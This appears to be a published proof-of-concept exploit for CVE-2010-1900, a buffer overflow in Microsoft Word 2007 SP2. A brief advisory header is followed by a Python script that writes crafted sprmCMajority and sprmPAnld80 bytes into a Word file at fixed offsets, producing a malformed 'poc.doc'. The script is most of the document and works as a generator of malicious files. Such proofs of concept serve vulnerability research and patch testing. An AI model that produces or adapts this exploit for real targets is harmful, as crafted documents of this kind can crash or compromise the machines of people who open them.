Microsoft Office Word 2007 sprmCMajority Buffer Overflow
========================================================

  Title               :  Microsoft Office Word sprmCMajority buffer overflow
  Version             :  Word 2007 SP 2
  Analysis           :  http://www.abysssec.com
  Vendor              :  http://www.microsoft.com
  Impact              :  Critical
  Contact             :  shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter             :  @abysssec
  CVE                 :  CVE-2010-1900
 
&#039;&#039;&#039;
 
import sys
 
def main():
    
    try:
        fdR = open(&#039;src.doc&#039;, &#039;rb+&#039;)
        strTotal = fdR.read()
        str1 = strTotal[:4082]
        str2 = strTotal[4088:]
         
        sprmCMajority = "\x47\xCA\xFF"    # sprmCMajority 
        sprmPAnld80 = "\x3E\xC6\xFF"    # sprmPAnld80
                 
        fdW= open(&#039;poc.doc&#039;, &#039;wb+&#039;)
        fdW.write(str1)
        fdW.write(sprmCMajority)
        fdW.write(sprmPAnld80)             
        fdW.write(str2)
         
        fdW.close()
        fdR.close()
        print &#039;[-] Word file generated&#039;
    except IOError:
        print &#039;[*] Error : An IO error has occurred&#039;
        print &#039;[-] Exiting ...&#039;
        sys.exit(-1)
                 
if __name__ == &#039;__main__&#039;:
    main()



